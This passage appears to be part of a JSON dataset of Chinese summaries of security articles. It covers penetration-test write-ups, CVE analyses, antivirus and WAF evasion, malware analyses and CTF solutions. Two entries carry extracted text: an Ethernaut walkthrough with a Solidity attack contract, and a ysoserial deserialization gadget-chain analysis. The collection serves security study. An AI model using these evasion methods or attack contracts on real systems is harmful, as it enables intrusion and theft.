        "page_content": "该文档介绍了如何使用 EHole 工具进行红队快速批量打点，通过从 Fofa 中提取 IP 和端口信息，并使用指纹识别技术识别易受攻击的系统，从而快速定位和攻击目标，实现内网渗透。",
        "FileName": "10442-利用 EHole 进行红队快速批量打点.pdf"
    },
    {
        "page_content": "本文介绍了如何提升 webshell 免杀的兼容性，通过修改代码中的变量名、函数名和加密方式，使 webshell 可以在 php5.2-php7.4 的不同版本中免杀。文中提供了具体的代码修改步骤和测试结果，并讨论了 waf 检测 webshell 的原理和绕过方法。",
        "FileName": "11391-webshell免杀-提升兼容性.pdf"
    },
    {
        "page_content": "该文档主要讨论了 JavaScript 中的原型链和原型污染漏洞，重点介绍了 __proto__ 和 prototype 属性之间的区别，以及如何利用这些属性来污染对象的原型链，从而导致任意代码执行。文档还提供了几个示例和利用方法，包括使用 merge 函数、敏感字符绕过、Lodash 模块和 Express 框架中的漏洞。",
        "FileName": "12328-Node.js些许漏洞.pdf"
    },
    {
        "page_content": "该文档记录了一次对 ThinkPHP 5.0.24 框架网站的渗透测试，通过利用 RCE 漏洞和禁用函数的疏忽，渗透者成功获得了网站的控制权。渗透过程中涉及了日志文件读取、数据库信息获取、反序列化漏洞利用等技术，最终通过 exec 函数执行命令拿下了网站的 shell。",
        "FileName": "9112-记一次tp5.0.24.pdf"
    },
    {
        "page_content": "该文档详细介绍了在 Windows 系统中获取和清除文件执行记录的各种方法，包括安全事件日志、Program Inventory、Program-Telemetry、ShimCache、UserAssist、MUICache、RunMRU、AppCompatFlags、ExecutedProgramsList、BAM、RecentApps、Prefetch、JumpLists、Amcache、SRUM、Windows Timeline 和计划任务。",
        "FileName": "7155-windows取证——文件执行记录的获取和清除.pdf"
    },
    {
        "page_content": "本文介绍了如何使用 PHP-Parser 库开发简单的 PHP 混淆器和解混淆器，并提供了示例代码。混淆器通过修改 AST 来复杂化代码，而解混淆器则通过识别混淆模式和提取密钥来还原代码。本文强调了混淆器和解混淆器在设计和侧重点上的差异，并提供了有关如何编写有效混淆器和解混淆器的建议。",
        "FileName": "7363-开发简单的PHP混淆器与解混淆器.pdf"
    },
    {
        "page_content": "焚靖是一个针对 CTF 赛事中常规 Jinja SSTI 题目的 WAF 检测与绕过工具，它融合了 CTF 赛事中常见的 SSTI 绕过技巧，可以灵活组合使用各类绕过技巧全自动构建 payload 绕过 WAF，支持自动扫描目标网站中的 form 元素进行攻击，也支持手动指定 payload 提交方式让其自动分析并产生 payload。",
        "FileName": "12586-焚靖：也许是一个CTF Jinja SSTI常规题通杀工具.pdf"
    },
    {
        "page_content": "该文档分析了 CVE-2022-35405 漏洞，该漏洞是 Zoho Password Manager Pro 中的 XML-RPC 反序列化远程代码执行漏洞。文档详细介绍了漏洞的利用过程，包括漏洞点定位、堆栈跟踪和 POC。",
        "FileName": "11578-CVE-2022-35405 Zoho Password Manager Pro XML-RPC RCE.pdf"
    },
    {
        "page_content": "本文探讨了红队渗透测试的主题，强调了其与传统渗透测试的区别，并概述了红队之路的特征、思路和常见技术。文章重点介绍了信息收集、内网渗透、横向移动、权限维持和对抗技术等方面，强调了武器化和跨界学习的重要性，并对红队未来的发展进行了展望。",
        "FileName": "7103-阿里白帽大会-红队的踩坑之路总结.pdf"
    },
    {
        "page_content": "本文介绍了作者在渗透测试中通过代码审计和漏洞利用成功获取 Java Servlet 站点的 shell 的过程。作者首先通过目录扫描和网络泄露等方法获取了系统的部分源码，然后通过分析 Servlet 的结构和 JSP 代码中的标签，掌握了代码审计的基础知识。接着，作者在 JSP 代码中发现了 SQL 注入漏洞，并通过 SQLMAP 工具成功获取了数据库的访问权限。最后，作者利用 Tomcat 的报错泄露了系统的路径，并通过 SQLMAP 的 --os-shell 参数获得了 shell，实现了后台 getshell。",
        "FileName": "9153-记一次Java Servlet实战审计.pdf"
    },
    {
        "page_content": "该文档分析了 Joker 家族恶意软件，该软件通过 Google Play 商店传播，窃取用户隐私并订阅付费服务以牟利。该家族最近变得更加“激进”，其样本下载量超过 10,000 次，成为 Google Play 商店上最活跃的家族之一。",
        "FileName": "8060-“激进”的Joker家族木马.pdf"
    },
    {
        "page_content": "该文档分析了 SSYCMS 内容管理系统中的存储型 XSS 漏洞，该漏洞存在于后台的多个功能中，包括内容管理、单页管理和友情链接管理。攻击者可以通过在标题、标签或描述字段中输入恶意脚本，将其存储在数据库中，并在其他用户访问相关页面时触发，从而导致 XSS 攻击。然而，在 UGC 投稿版本中，用户提交的内容会经过 HTMLPurifier 过滤，因此不会触发 XSS 漏洞。",
        "FileName": "7227-ssycms代码审计：后台存储型XSS.pdf"
    },
    {
        "page_content": "该文档重点介绍了渗透测试中的信息收集技术，包括使用爆破工具、扫描输出文件、病毒扫描引擎、子域名自动化搜索和爬取敏感路径来查找敏感数据。通过这些技术，渗透测试人员可以扩大渗透测试范围，找到目标站点的突破口，并获取重要的敏感信息。",
        "FileName": "9994-渗透测试---信息收集(细!).pdf"
    },
    {
        "page_content": "该文档详细介绍了 WolfSecCTF 比赛中遇到的几个有趣的 Web 题目的解题过程，包括 SSRF、XSS、SSRF 301、SSRF 401 和 OSINT-Where in the world 题型，并提供了详细的解题思路和 payload。",
        "FileName": "11377-WolfSecCTF 几道有趣的题目.pdf"
    },
    {
        "page_content": "该文档分析了 PbootCMS v2.0.7 中的两个漏洞：任意文件读取和模板注入。任意文件读取漏洞允许攻击者读取服务器上的任何文件，而模板注入漏洞允许攻击者执行任意 PHP 代码。文档详细描述了如何利用这两个漏洞来获得对目标系统的完全控制权。",
        "FileName": "7628-PbootCMS v2.0.7从前台数据库下载到后台RCE研究.pdf"
    },
    {
        "page_content": "Nexus Repository Manager 3 中的 JEXL3 表达式注入漏洞允许未经授权的访问者发送精心构造的恶意 JSON 数据，从而导致 JEXL3 表达式注入并远程执行任意命令。该漏洞影响 Nexus Repository Manager OSS/Pro 3.x - 3.14.0，已在 Nexus Repository Manager OSS/Pro 3.15.0 中修复。",
        "FileName": "8099-Nexus Repository Manager3 JEXL3表达式注入浅析.pdf"
    },
    {
        "page_content": "该文档分析了 jshERP3.0 代码中的安全漏洞，包括 Fastjson 反序列化、SQL 注入、XSS 攻击和登录绕过。文档建议通过升级版本、使用白名单、预编译、过滤类和安全框架来修复这些漏洞。",
        "FileName": "12174-jshERP3.0 代码审计.pdf"
    },
    {
        "page_content": "该文档分析了 CVE-2017-13089 漏洞，该漏洞是由于 wget 组件在处理 401 状态码的响应包时，没有对读取的包做正负检查，导致整数栈溢出。通过静态和动态分析，确定了漏洞点在 skip_short_body 函数中，该函数将一个负数与整数进行比较，导致栈溢出。更新的补丁通过判断 strtol 函数的返回值是否为负数来防止整数溢出。",
        "FileName": "7394-CVE-2017-13089 wget 栈溢出漏洞复现.pdf"
    },
    {
        "page_content": "Stowaway 是一款用 Go 语言编写的多级代理工具，它允许用户通过多个节点将外部流量代理到内网，并提供管理功能。该工具具有节点管理、多平台适配、多级 socks5 流量代理转发、ssh 代理连接、远程交互式 shell、上传和下载文件等特性。Stowaway 分为 admin 端和 agent 端，admin 端用于管理节点和流量，agent 端用于代理流量和执行命令。",
        "FileName": "7119-Stowaway---go语言编写的多级代理工具.pdf"
    },
    {
        "page_content": "该文档分析了 Weblogic Console 中的两个漏洞，CVE-2020-14882 和 CVE-2020-14883，这些漏洞可用于绕过身份验证并执行任意代码。第一个漏洞利用了 JNDI 注入，而第二个漏洞利用了路径遍历来规避需要身份验证的受限资源。通过结合这两个漏洞，攻击者可以未经授权地访问受限资源并执行任意代码。",
        "FileName": "9203-Weblogic Console漏洞分析.pdf"
    },
    {
        "page_content": "该文档介绍了 House of Orange 攻击技术，该技术利用了 glibc 2.23-2.26 中的堆溢出漏洞，通过修改 top_chunk 的大小，将 top_chunk 送入 unsorted bin 中，从而获得一个可利用的堆块。该技术通常与 FSOP 攻击相结合，通过伪造 IO 结构体来触发 FSOP，最终获得系统权限。",
        "FileName": "12389-house of orange & no free.pdf"
    },
    {
        "page_content": "该文档分析了 Resin 服务器中存在的一个解析漏洞，该漏洞允许攻击者通过对请求路径进行编码来绕过安全检查，从而执行任意代码。漏洞的根源在于 Resin 在解析请求路径时对 URI 进行解码和规范化处理，导致攻击者可以利用特殊字符序列来绕过安全检查。文档详细描述了漏洞的利用过程，包括请求路径的编码、解码和规范化处理的具体步骤，并提供了相应的代码示例。",
        "FileName": "12110-Java安全之Resin解析漏洞分析.pdf"
    },
    {
        "page_content": "该文档分析了使用 Go 语言进行 shellcode 免杀的各种技术，包括通过 DLL 调用获取函数地址、函数调用以及使用 base64 加密和解密 shellcode。它还提供了使用不同方法加载 shellcode 的示例代码，例如 loadlibrary、MustLoadDLL 和 NewLazyDLL。",
        "FileName": "11279-golang免杀初尝试.pdf"
    },
    {
        "page_content": "XML 外部实体注入 (XXE) 是一种 XML 漏洞，允许攻击者通过外部实体引用来读取或修改 XML 文档中的数据。XXE 漏洞的利用涉及使用 DTD（文档类型定义）来定义外部实体，该实体引用外部文件或资源。攻击者可以利用此漏洞来读取敏感文件、执行命令或进行其他恶意活动。",
        "FileName": "12325-对于XXE的理解.pdf"
    },
    {
        "page_content": "该文档分析了 Apache Struts2 中的远程代码执行漏洞 (CVE-2021-31805)，该漏洞是由于 CVE-2020-17530 修复不完整造成的。该漏洞允许攻击者通过 OGNL 表达式注入和沙箱绕过技术执行任意代码。文档详细介绍了漏洞的原理、环境搭建、漏洞分析和修复建议。",
        "FileName": "11386-CVE-2021-31805 Apache Struts2 远程代码执行漏洞分析.pdf"
    },
    {
        "page_content": "XDcms3.0.1是一款具有教学意义的CMS软件，包含常规配置、框架启动、漏洞挖掘等内容。通过分析其框架结构和安全函数，发现了一个XSS漏洞和一个SQL注入漏洞，利用万能密码绕过密码加密，最终成功获取后台权限并获取shell。",
        "FileName": "9466-XDcms3.0.1挖掘新利用.pdf"
    },
    {
        "page_content": "该文档详细介绍了在三层网络环境下的域渗透过程，包括外网渗透（利用 Redis 主从复制 RCE）、提权（利用 CVE-2021-4034）、内网渗透（利用 MS17-010）、域内信息收集（使用 mimikatz 导出密码）和横向移动（使用 psexec）。",
        "FileName": "12234-记一次三层网络环境下的域渗透.pdf"
    },
    {
        "page_content": "**文档主题：Ethernaut 闯关录（下）**\n\n**文档内容：**\n\nEthernaut 闯关录（下） Al1ex / 2020-02-26 09:40:09 / 浏览数 12372 这⾥继续接着 \"Ethernaut 闯关录 ( 上 )\" 中的闯关模式继续对剩下的关卡进⾏闯关。 合同代表⼀个⾮常简单的游戏：谁给它发送了⽐当前奖⾦还⼤的数量的以太，就成为新的国王。在这样的事件中，被推翻的国王获 得了新的奖⾦，但是如果你提交的话那么合约就会回退，让 level 重新成为国王，⽽我们的⽬标就是阻⽌这⼀情况的发⽣。 pragma \t solidity \t ^ 0.4.18 ; import \t 'zeppelin-solidity/contracts/ownership/Ownable.sol' ; contract \t King \t is \t Ownable \t { \t\t address \t public \t king ; \t\t uint \t public \t prize ; \t\t function \t King () \t public \t payable \t { \t\t\t\t king \t = \t msg . sender ; \t\t\t\t prize \t = \t msg . value ; \t\t } \t\t function () \t external \t payable \t { \t\t\t\t require ( msg . value \t >= \t prize \t || \t msg . sender \t == \t owner ); \t\t\t\t king . transfer ( msg . value ); \t\t\t\t king \t = \t msg . sender ; \t\t\t\t prize \t = \t msg . value ; \t\t } } 从上⾯的代码中可以看到当国王被推翻时国王将会获得奖⾦，那么只要国王拒绝接受奖⾦就可以⼀直是国王。 通过上⾯的代码分析，我们可以部署以下攻击合约 , 当原智能合约有新的 king 诞⽣时会向我们的合约退还之前的奖⾦，但是攻击合约 不接收，直接 revert() 那么就可以永远占据合约的 king 不放： pragma \t solidity \t ^ 0.4.18 ; contract \t attack { \t\t\t\t function \t attack (\n2.king 诞⽣时会向我们的合约退还之前的奖⾦，但是攻击合约 不接收，直接 revert() 那么就可以永远占据合约的 king 不放： pragma \t solidity \t ^ 0.4.18 ; contract \t attack { \t\t\t\t function \t attack ( address \t _addr ) \t public \t payable { \t\t\t\t\t\t\t\t _addr . call . gas ( 10000000 ). value ( msg . value )(); \t\t\t\t } \t\t\t\t function \t () \t public \t { \t\t\t\t\t\t\t\t revert (); \t\t\t\t } } 前⾔ 闯关斩将 King 闯关要求 合约代码 合约分析点击 “Get new Instance” 来获取⼀个实例： 之后先来查看⼀下 prize 值以及合约的 king 、合约的地址 之后我们在 remix 中编译并部署攻击合约： 攻击流程合约部署地址： 之后再次查看 king ，发现已经变成了我们攻击合约的地址：之后我们点击 “submit instance” 来提交该实例： 之后成功过关，当我们查看 king 时发现依旧是我们的攻击合约的地址：盗取合约中的所有代币。 pragma \t solidity \t ^ 0.4.18 ; import \t 'openzeppelin-solidity/contracts/math/SafeMath.sol' ; contract \t Reentrance \t { \t\t using \t SafeMath \t for \t uint256 ; \t\t mapping ( address \t => \t uint ) \t public \t balances ; \t\t function \t donate ( address \t _to ) \t public \t payable \t { \t\t\t\t balances [ _to ] \t = \t balances [ _to ]. add ( msg . value ); \t\t } \t\t function \t balanceOf ( address \t _who ) \t public \t view \t returns \t ( uint \t balance ) \t {\n3._to ] \t = \t balances [ _to ]. add ( msg . value ); \t\t } \t\t function \t balanceOf ( address \t _who ) \t public \t view \t returns \t ( uint \t balance ) \t { \t\t\t\t return \t balances [ _who ]; \t\t } \t\t function \t withdraw ( uint \t _amount ) \t public \t { \t\t\t\t if ( balances [ msg . sender ] \t >= \t _amount ) \t { \t\t\t\t\t\t if ( msg . sender . call . value ( _amount )()) \t { \t\t\t\t\t\t\t\t _amount ; \t\t\t\t\t\t } \t\t\t\t\t\t balances [ msg . sender ] \t -= \t _amount ; \t\t\t\t } \t\t } \t\t function () \t public \t payable \t {} } 从上⾯的源代码可以确定这⾥应该为以太坊⾥的重⼊攻击，这也是之前 The DAO 事件⾥⿊客所⽤到的攻击。 Re-entrancy 闯关要求 合约代码 合约分析在这⾥我们重点来看 withdraw 函数，我们可以看到它接收了⼀个 _amount 参数，将其与发送者的 balance 进⾏⽐较，不超过发送者 的 balance 就将这些 _amount 发送给 sender ，同时我们注意到这⾥它⽤来发送 ether 的函数是 call.value, 发送完成后，它才在下⾯更 新了 sender 的 balances ，这⾥就是可重⼊攻击的关键所在了，因为该函数在发送 ether 后才更新余额，所以我们可以想办法让它卡 在 call.value 这⾥不断给我们发送 ether ，同样利⽤的是我们熟悉的 fallback 函数来实现。 当然，这⾥还有另外⼀个关键的地⽅ ——call.value 函数特性，当我们使⽤ call.value() 来调⽤代码时，执⾏的代码会被赋予账户所有 可⽤的 gas, 这样就能保证我们的 fallback 函数能被顺利执⾏，对应的，如果我们使⽤ transfer 和 send",
        "FileName": "7174-Ethernaut闯关录（下）.pdf"
    },
    {
        "page_content": "该文档介绍了如何免杀 mimikatz 源码，包括修改版本信息、删除 banner、修改特征码字节和加壳等方法。通过这些方法，作者成功绕过了 360 和火绒杀毒软件的静态和动态查杀，实现了免杀效果。",
        "FileName": "11378-mimikatz源码免杀初探.pdf"
    },
    {
        "page_content": "**文档主题：** 分析如下文档并完成以下任务：\n\n**文档内容：**\n\n```\n1.登录 ysoserial CommonsCollections1-7 分析 ysoserial CommonsCollections1-7 分析 By 七友   /  2020-08-25 09:58:39  /  浏览数  10764 整理了⼀下之前的笔记，⽂中不对⼀些前置知识进⾏科普，如 \t javassist \t 、动态代理等，如果不了解的同学可以⾃⾏百度哈。 ysoserial 给出调⽤栈如下： Gadget\tchain: \t\t\t\tObjectInputStream.readObject() \t\t\t\t\t\t\t\tAnnotationInvocationHandler.readObject() \t\t\t\t\t\t\t\t\t\t\t\tMap(Proxy).entrySet() \t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tAnnotationInvocationHandler.invoke() \t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tLazyMap.get() \t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tChainedTransformer.transform() \t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tConstantTransformer.transform() \t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tInvokerTransformer.transform() \t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tMethod.invoke() \t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tClass.getMethod() \t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tInvokerTransformer.transform() \t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tMethod.invoke() \t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tRuntime.getRuntime() \t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tInvokerTransformer.transform() \t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tMethod.invoke()\n2.InvokerTransformer.transform() \t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tMethod.invoke() \t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tRuntime.exec() 我们先从最底下调⽤ \t Runtime.exec \t 的地⽅开始，跟进 \t org.apache.commons.collections.functors.InvokerTransformer#tr ansform \t ，可以看到有反射的调⽤，所以我们需要寻找对此⽅法调⽤的地⽅ public \t Object \t transform ( Object \t input ) \t { \t\t\t\t if \t ( input \t == \t null ) \t { \t\t\t\t\t\t\t\t return \t null ; \t\t\t\t } \t\t\t\t try \t { \t\t\t\t\t\t\t\t Class \t cls \t = \t input . getClass (); \t\t\t\t\t\t\t\t Method \t method \t = \t cls . getMethod ( iMethodName , \t iParamTypes ); \t\t\t\t\t\t\t\t return \t method . invoke ( input , \t iArgs ); \t\t\t\t } \t catch \t ( NoSuchMethodException \t ex ) \t { \t\t\t\t\t\t\t\t throw \t new \t FunctorException ( \"InvokerTransformer:\tThe\tmethod\t'\" \t + \t iMethodName \t + \t \"'\ton\t'\" \t + \t input . getClass () \t + \t \"'\tdoes\tnot\texist\" ); \t\t\t\t } \t catch \t ( IllegalAccessException \t ex ) \t { \t\t\t\t\t\t\t\t throw \t new \t FunctorException ( \"InvokerTransformer:\tThe\tmethod\t'\" \t + \t iMethodName \t + \t \"'\ton\t'\" \t +\n3.IllegalAccessException \t ex ) \t { \t\t\t\t\t\t\t\t throw \t new \t FunctorException ( \"InvokerTransformer:\tThe\tmethod\t'\" \t + \t iMethodName \t + \t \"'\ton\t'\" \t + \t input . getClass () \t + \t \"'\tcannot\tbe\taccessed\" ); \t\t\t\t } \t catch \t ( InvocationTargetException \t ex ) \t { \t\t\t\t\t\t\t\t throw \t new \t FunctorException ( \"InvokerTransformer:\tThe\tmethod\t'\" \t + \t iMethodName \t + \t \"'\ton\t'\" \t + \t input . getClass () \t + \t \"'\tthrew\tan\texception\" , \t ex ); \t\t\t\t } } 前⾔ 分析 CommonsCollections1跟进 \t org.apache.commons.collections.functors.ChainedTransformer#transform \t 此处的 \t iTransformers \t 我们可以在 \t Chai nedTransformer \t 实例化的时候传进去，进⽽可以达到调⽤ \t org.apache.commons.collections.functors.InvokerTransformer# transform \t 的⽬的 private\tfinal\tTransformer[]\tiTransformers; public\tChainedTransformer(Transformer[]\ttransformers)\t{ \t\t\t\tthis.iTransformers\t=\ttransformers; } // 省略部分代码 public\tObject\ttransform(Object\tobject)\t{ \t\t\t\tfor\t(int\ti\t=\t0;\ti\t<\tiTransformers.length;\ti++)\t{ \t\t\t\t\t\t\t\tobject\t=\tiTransformers[i].transform(object); \t\t\t\t}\n4.for\t(int\ti\t=\t0;\ti\t<\tiTransformers.length;\ti++)\t{ \t\t\t\t\t\t\t\tobject\t=\tiTransformers[i].transform(object); \t\t\t\t} \t\t\t\treturn\tobject; } 跟进 \t org.apache.commons.collections.map.LazyMap#get \t ，此处的 \t this.factory \t 我们可以通过 \t org.apache.commons.coll ections.map.LazyMap#decorate \t 将我们的 \t org.apache.commons.collections.functors.ChainedTransformer \t 的实例传进去 protected \t final \t Transformer \t factory ; public \t static \t Map \t decorate ( Map \t map , \t Transformer \t factory ) \t { \t\t\t\t return \t new \t LazyMap ( map , \t factory ); } protected \t LazyMap ( Map \t map , \t Factory \t factory ) \t { \t\t\t\t super ( map ); \t\t\t\t if \t ( factory \t == \t null ) \t { \t\t\t\t\t\t\t\t throw \t new \t IllegalArgumentException ( \"Factory\tmust\tnot\tbe\tnull\" ); \t\t\t\t } \t else \t { \t\t\t\t\t\t\t\t this . factory \t = \t FactoryTransformer . getInstance ( factory ); \t\t\t\t } } // 省略部分代码 public \t Object \t get ( Object \t key ) \t { \t\t\t\t if \t (! super . map . containsKey ( key )) \t { \t\t\t\t\t\t\t\t Object \t value \t = \t this . factory . transform ( key );\n5.get ( Object \t key ) \t { \t\t\t\t if \t (! super . map . containsKey ( key )) \t { \t\t\t\t\t\t\t\t Object \t value \t = \t this . factory . transform ( key ); \t\t\t\t\t\t\t\t super . map . put ( key , \t value ); \t\t\t\t\t\t\t\t return \t value ; \t\t\t\t } \t else \t { \t\t\t\t\t\t\t\t return \t super . map . get ( key ); \t\t\t\t } } 所以我们怎么样才能调⽤ \t org.apache.commons.collections.map.LazyMap#get \t 呢，看到 \t ysoserial \t 给调⽤栈，跟进 \t sun.ref lect.annotation.AnnotationInvocationHandler#invoke \t ，可以看到此处的 \t memberValues \t 为⼀个 Map ，且 \t invoke \t ⽅法中有 \t this.memberValues.get(var4) \t ，也就是说我们可以通过 \t invoke \t 调⽤到 \t org.apache.commons.collections.map.LazyMap#g et \tprivate \t final \t Map < String , \t Object > \t memberValues ; public \t Object \t invoke ( Object \t var1 , \t Method \t var2 , \t Object [] \t var3 ) \t { \t\t\t\t String \t var4 \t = \t var2 . getName (); \t\t\t\t Class [] \t var5 \t = \t var2 . getParameterTypes (); \t\t\t\t if \t ( var4 . equals ( \"equals\" ) \t && \t var5 . length \t == \t 1 \t && \t var5 [ 0 ] \t == \t Object . class ) \t { \t\t\t\t\t\t\t\t return \t this .\n6.(); \t\t\t\t if \t ( var4 . equals ( \"equals\" ) \t && \t var5 . length \t == \t 1 \t && \t var5 [ 0 ] \t == \t Object . class ) \t { \t\t\t\t\t\t\t\t return \t this . equalsImpl ( var3 [ 0 ]); \t\t\t\t } \t else \t if \t ( var5 . length \t != \t 0 ) \t { \t\t\t\t\t\t\t\t throw \t new \t AssertionError ( \"Too\tmany\tparameters\tfor\tan\tannotation\tmethod\" ); \t\t\t\t } \t else \t { \t\t\t\t\t\t\t\t // 省略部分代码 \t\t\t\t\t\t\t\t switch ( var7 ) \t { \t\t\t\t\t\t\t\t case \t 0 : \t\t\t\t\t\t\t\t\t\t\t\t return \t this . toStringImpl (); \t\t\t\t\t\t\t\t case \t 1 : \t\t\t\t\t\t\t\t\t\t\t\t return \t this . hashCodeImpl (); \t\t\t\t\t\t\t\t case \t 2 : \t\t\t\t\t\t\t\t\t\t\t\t return \t this . type ; \t\t\t\t\t\t\t\t default : \t\t\t\t\t\t\t\t\t\t\t\t Object \t var6 \t = \t this . memberValues . get ( var4 ); \t\t\t\t\t\t\t\t\t\t\t\t if \t ( var6 \t == \t null ) \t { \t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t throw \t new \t IncompleteAnnotationException ( this . type , \t var4 ); \t\t\t\t\t\t\t\t\t\t\t\t } \t else \t if \t ( var6 \t instanceof \t ExceptionProxy ) \t { \t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t throw \t (( ExceptionProxy ) var6 ). generateException (); \t\t\t\t\t\t\t\t\t\t\t\t } \t else \t { \t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t if \t ( var6 . getClass\n7.) \t { \t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t throw \t (( ExceptionProxy ) var6 ). generateException (); \t\t\t\t\t\t\t\t\t\t\t\t } \t else \t { \t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t if \t ( var6 . getClass (). isArray () \t && \t Array . getLength ( var6 ) \t != \t 0 ) \t { \t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t var6 \t = \t this . cloneArray ( var6 ); \t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t } \t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t return \t",
        "FileName": "8164-ysoserial CommonsCollections1-7分析.pdf"
    },
    {
        "page_content": "该文档分析了 Python Flask 框架中的 SSTI 漏洞，该漏洞允许攻击者通过注入恶意代码来执行 Python 内存马。文档详细解释了漏洞的利用过程，包括如何绕过过滤和使用变形 Payload。",
        "FileName": "10933-Python 内存马分析.pdf"
    },
    {
        "page_content": "该文档分析了如下内容：\n- 攻击者利用 Docker API 未授权漏洞恶意挖矿和后续的内网渗透过程。\n- 攻击者通过 POST 请求向 /containers/create 端点发送数据，绕过授权，创建新的实例，并挂载根目录到实例中，然后把 ssh 公钥写入物理服务器的 /root/.ssh/authorized_keys 文件中，实现提权。\n- 攻击者下载 cronb.sh 脚本，剔除阿里云的保护机制，并下载和运行 cronis.sh 和 cronscan 脚本，启动扫描器并下载 cronrs.sh，运行扫描器查找内网和部分腾讯云及阿里云 ip 段的 redis 未授权漏洞，扩大攻击范围。",
        "FileName": "10015-记一次寻找docker未授权新的利用方式结果变成样本分析这件事.pdf"
    },
    {
        "page_content": "该文档分析了 CVE-2021-2471 JDBC-XXE 漏洞，该漏洞存在于 MySQL JDBC 驱动中，原因是 getSource 方法未对传入的 XML 数据进行验证，导致攻击者可构造恶意 XML 数据引入外部实体，从而造成 XXE 攻击。漏洞影响 MySQL JDBC 8.0.27 之前的版本，补丁通过在 getSource 方法中添加对 XML 数据的验证来修复。",
        "FileName": "10440-CVE-2021-2471 JDBC-XXE漏洞分析.pdf"
    },
    {
        "page_content": "**主题：** CAS 客户端身份验证绕过技巧\n\n**内容：** 文档介绍了两种绕过 CAS 客户端身份验证的技巧，包括忽略模式和后缀模式匹配。这些技巧利用了 CAS 客户端身份验证过滤器在匹配 URL 时存在的问题，以及 Springboot 在处理路由时默认启用后缀模式匹配。文档还提供了修复这些绕过技巧的方法，包括使用正则表达式匹配忽略模式和关闭后缀模式匹配。",
        "FileName": "9557-Two Tricks Of CAS-CLIENT AUTH Bypass.pdf"
    },
    {
        "page_content": "该文档分析了一个恶意短信拦截应用程序，该应用程序具有以下恶意意图：拦截短信、隐藏图标、监控收件箱、向病毒制作者发送拦截到的短信，包括发送者的手机号码、设备信息和设备手机号码。",
        "FileName": "9931-一个短信拦截马的简单分析.pdf"
    },
    {
        "page_content": "本文介绍了内核漏洞利用的入门知识，重点关注一个简单的 Linux 字符设备驱动程序，该驱动程序允许用户以指定用户身份执行命令。该驱动程序包含一个 IOCTL 处理程序，该处理程序接受一个指向用户态数据结构的指针，其中包含用户 ID 和要执行的命令。该漏洞利用利用了条件竞争漏洞，称为“双重获取”，其中在内核模式和用户模式之间存在数据访问竞争。通过在验证用户 ID 后修改用户 ID，攻击者可以绕过任何检查并以提升的权限执行命令。",
        "FileName": "9808-内核漏洞利用入门 Part 1.pdf"
    },
    {
        "page_content": "Fortify 是一款商业级源码扫描工具，其工作原理类似于 codeql，通过分析源码提取相关信息，然后加载规则进行扫描，扫描结果保存为 .fpr 文件，用户可以使用 GUI 程序对结果进行分析，排查漏洞。本文介绍了 Fortify 的工作原理、规则编写方法以及与 codeql 相比的优势。",
        "FileName": "9276-CC++源码扫描系列- Fortify 篇.pdf"
    },
    {
        "page_content": "该文档介绍了漏洞验证框架的规则体系设计，包括原始请求来源、兼容 Xray 规则、扩展 Xray 规则，并提供了具体实现代码和相关参考链接。",
        "FileName": "9857-漏洞验证框架的构思与实现（二）.pdf"
    },
    {
        "page_content": "该文档描述了某 CMS v4.3.3 到 v4.5.1 后台任意代码注入漏洞，该漏洞允许攻击者在具有管理员权限或具有 \"应用\"->\"任务队列\" 管理权限时，通过文件写入和文件包含，在 WRITEPATH.'config/cron.php' 文件中写入任意内容，从而导致任意代码执行。",
        "FileName": "11425-某CMS v4.3.3到v4.5.1后台任意代码注入漏洞(文件写入加文件包含).pdf"
    },
    {
        "page_content": "该文档详细介绍了如何通过各种方法解决网络安全实验室中的脚本关、逗比验证码、微笑关卡、XSS 基础关等一系列关卡，并提供了相应的代码和步骤，帮助用户理解和解决这些关卡中的技术问题。",
        "FileName": "12142-网络安全实验室3.脚本关.pdf"
    },
    {
        "page_content": "本文研究了机器学习分类器在检测 DOM XSS 漏洞方面的能力，并提出了一种低延迟、高召回率的分类器，可以作为污点跟踪的预过滤器，将独立污点跟踪的成本降低 3.43 倍，同时检测 94.5% 的独特漏洞。",
        "FileName": "9721-使用机器学习轻量级混合方法检测DOM XSS漏洞.pdf"
    },
    {
        "page_content": "该文档分析了 CVE-2018-18557 漏洞，该漏洞存在于 LibTIFF 4.0.9 中，由于在解码 JBIG 时没有对 size 进行验证，导致堆溢出。文档提供了复现漏洞的步骤，包括编译安装 LibTIFF 和编写 POC 代码，并分析了漏洞的触发过程和堆溢出的原因。",
        "FileName": "7590-CVE-2018-18557复现与分析.pdf"
    },
    {
